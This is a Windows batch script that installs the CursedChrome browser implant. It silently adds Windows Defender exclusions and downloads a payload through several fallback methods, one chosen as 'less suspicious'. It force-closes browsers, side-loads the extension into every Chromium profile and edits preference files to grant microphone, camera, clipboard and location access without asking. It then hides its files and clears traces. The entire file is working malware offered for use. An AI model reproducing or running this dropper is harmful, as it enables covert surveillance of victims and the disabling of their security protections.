@echo off
setlocal EnableDelayedExpansion

:: ============================================
:: CursedChrome Extension Installer
:: Bypass Windows Security + Auto Audio Permission
:: ============================================

:: === CONFIGURATION ===
set "EXT_URL=https://your-server.com/extension.zip"
set "EXT_ID=ccimplant"
set "FIXED_EXT_ID=aaaaaaaabbbbbbbbccccccccdddddddd"

:: Obfuscated paths (avoid common detection patterns)
set "TEMP_DIR=%TEMP%\mscorlib_%RANDOM%"
set "INSTALL_DIR=%APPDATA%\Microsoft\CLR Security Config\%EXT_ID%"

mkdir "%TEMP_DIR%" 2>nul
mkdir "%INSTALL_DIR%" 2>nul

:: ============================================
:: Step 1: Add exclusions to Windows Defender
:: (Requires admin, will silently fail if not admin)
:: ============================================
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
  "try { Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue } catch {}" 2>nul
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
  "try { Add-MpPreference -ExclusionPath '%TEMP_DIR%' -ErrorAction SilentlyContinue } catch {}" 2>nul
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
  "try { Add-MpPreference -ExclusionExtension '.js','.json' -ErrorAction SilentlyContinue } catch {}" 2>nul

:: ============================================
:: Step 2: Download using multiple methods (fallback)
:: ============================================
:download
set "DL_SUCCESS=0"

:: Method 1: PowerShell Invoke-WebRequest (most common)
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
  "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;try{Invoke-WebRequest -Uri '%EXT_URL%' -OutFile '%TEMP_DIR%\pkg.zip' -UseBasicParsing -ErrorAction Stop;exit 0}catch{exit 1}" 2>nul
if %ERRORLEVEL% equ 0 set "DL_SUCCESS=1"

:: Method 2: PowerShell WebClient (older systems)
if "!DL_SUCCESS!"=="0" (
    powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
      "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;try{(New-Object Net.WebClient).DownloadFile('%EXT_URL%','%TEMP_DIR%\pkg.zip');exit 0}catch{exit 1}" 2>nul
    if !ERRORLEVEL! equ 0 set "DL_SUCCESS=1"
)

:: Method 3: BitsTransfer (Background Intelligent Transfer)
if "!DL_SUCCESS!"=="0" (
    powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
      "Import-Module BitsTransfer;Start-BitsTransfer -Source '%EXT_URL%' -Destination '%TEMP_DIR%\pkg.zip' -ErrorAction SilentlyContinue" 2>nul
    if exist "%TEMP_DIR%\pkg.zip" set "DL_SUCCESS=1"
)

:: Method 4: certutil (built-in, less suspicious)
if "!DL_SUCCESS!"=="0" (
    certutil -urlcache -split -f "%EXT_URL%" "%TEMP_DIR%\pkg.zip" >nul 2>&1
    if exist "%TEMP_DIR%\pkg.zip" set "DL_SUCCESS=1"
)

if "!DL_SUCCESS!"=="0" goto :cleanup

:: ============================================
:: Step 3: Extract (multiple methods)
:: ============================================
:: Method 1: PowerShell Expand-Archive
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
  "Expand-Archive -Path '%TEMP_DIR%\pkg.zip' -DestinationPath '%INSTALL_DIR%' -Force -ErrorAction SilentlyContinue" 2>nul

:: Method 2: COM Shell.Application (fallback for older systems)
if not exist "%INSTALL_DIR%\manifest.json" (
    powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
      "$s=New-Object -COM Shell.Application;$z=$s.NameSpace('%TEMP_DIR%\pkg.zip');$d=$s.NameSpace('%INSTALL_DIR%');$d.CopyHere($z.Items(),16)" 2>nul
)

:: Find manifest (handle nested folders)
for /d %%D in ("%INSTALL_DIR%\*") do (
    if exist "%%D\manifest.json" set "INSTALL_DIR=%%D"
)

if not exist "%INSTALL_DIR%\manifest.json" goto :cleanup

:: ============================================
:: Step 4: Close browsers (graceful then force)
:: ============================================
:: Graceful close first
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
  "Get-Process chrome,msedge,brave,vivaldi,opera -ErrorAction SilentlyContinue | ForEach-Object { $_.CloseMainWindow() | Out-Null }" 2>nul
timeout /t 2 /nobreak >nul 2>&1

:: Force kill remaining
taskkill /F /IM chrome.exe /T >nul 2>&1
taskkill /F /IM msedge.exe /T >nul 2>&1
taskkill /F /IM brave.exe /T >nul 2>&1
taskkill /F /IM vivaldi.exe /T >nul 2>&1
taskkill /F /IM opera.exe /T >nul 2>&1
timeout /t 1 /nobreak >nul 2>&1

:: ============================================
:: Step 5: Install to all browsers
:: ============================================
set "BROWSERS[0]=%LOCALAPPDATA%\Google\Chrome\User Data"
set "BROWSERS[1]=%LOCALAPPDATA%\Microsoft\Edge\User Data"
set "BROWSERS[2]=%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"
set "BROWSERS[3]=%LOCALAPPDATA%\Vivaldi\User Data"
set "BROWSERS[4]=%APPDATA%\Opera Software\Opera Stable"
set "BROWSERS[5]=%APPDATA%\Opera Software\Opera GX Stable"
set "BROWSERS[6]=%LOCALAPPDATA%\Chromium\User Data"

for /L %%i in (0,1,6) do (
    set "BROWSER_PATH=!BROWSERS[%%i]!"
    if exist "!BROWSER_PATH!" (
        for /d %%P in ("!BROWSER_PATH!\*") do (
            set "PROFILE_NAME=%%~nxP"
            if /i "!PROFILE_NAME!"=="Default" call :install_profile "!BROWSER_PATH!\!PROFILE_NAME!"
            if /i "!PROFILE_NAME:~0,7!"=="Profile" call :install_profile "!BROWSER_PATH!\!PROFILE_NAME!"
        )
        call :install_profile "!BROWSER_PATH!\Default"
    )
)

:: ============================================
:: Step 6: Set file attributes to hidden
:: ============================================
attrib +h +s "%INSTALL_DIR%" 2>nul
attrib +h +s "%INSTALL_DIR%\*.*" /s 2>nul

goto :cleanup

:: ============================================
:: FUNCTION: Install to profile + grant permissions
:: ============================================
:install_profile
set "PROFILE_PATH=%~1"
if not exist "%PROFILE_PATH%" exit /b 0

:: External Extensions
set "EXT_JSON_DIR=%PROFILE_PATH%\External Extensions"
mkdir "%EXT_JSON_DIR%" 2>nul

set "JSON_PATH=%EXT_JSON_DIR%\%FIXED_EXT_ID%.json"
set "ESCAPED_PATH=%INSTALL_DIR:\=\\%"
(
echo {"external_crx":"%ESCAPED_PATH%","external_version":"1.0.0"}
) > "%JSON_PATH%" 2>nul

:: ============================================
:: Grant permissions via Preferences modification
:: ============================================
set "PREFS_FILE=%PROFILE_PATH%\Preferences"
if not exist "%PREFS_FILE%" exit /b 0

:: Use PowerShell to modify Preferences JSON
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
  "$p='%PREFS_FILE%';$e='%FIXED_EXT_ID%';try{$j=Get-Content $p -Raw|ConvertFrom-Json;" ^
  "if(-not $j.profile){$j|Add-Member -N 'profile' -V @{} -F};" ^
  "if(-not $j.profile.content_settings){$j.profile|Add-Member -N 'content_settings' -V @{} -F};" ^
  "if(-not $j.profile.content_settings.exceptions){$j.profile.content_settings|Add-Member -N 'exceptions' -V @{} -F};" ^
  "$o=\"chrome-extension://$e,*\";$s=@{setting=1;last_modified=[long]((Get-Date)-[datetime]'1970-1-1').TotalMilliseconds};" ^
  "@('media_stream_mic','media_stream_camera','notifications','autoplay','clipboard','geolocation')|%%{" ^
  "if(-not $j.profile.content_settings.exceptions.$_){$j.profile.content_settings.exceptions|Add-Member -N $_ -V @{} -F};" ^
  "$j.profile.content_settings.exceptions.$_|Add-Member -N $o -V $s -F};" ^
  "$j|ConvertTo-Json -D 100 -C|Set-Content $p -Enc UTF8}catch{}" 2>nul

exit /b 0

:: ============================================
:: Cleanup
:: ============================================
:cleanup
:: Clear download cache
certutil -urlcache -delete "%EXT_URL%" >nul 2>&1

:: Remove temp files
rd /s /q "%TEMP_DIR%" 2>nul

:: Clear this script from recent (optional)
del /f /q "%APPDATA%\Microsoft\Windows\Recent\*.lnk" 2>nul

exit /b 0
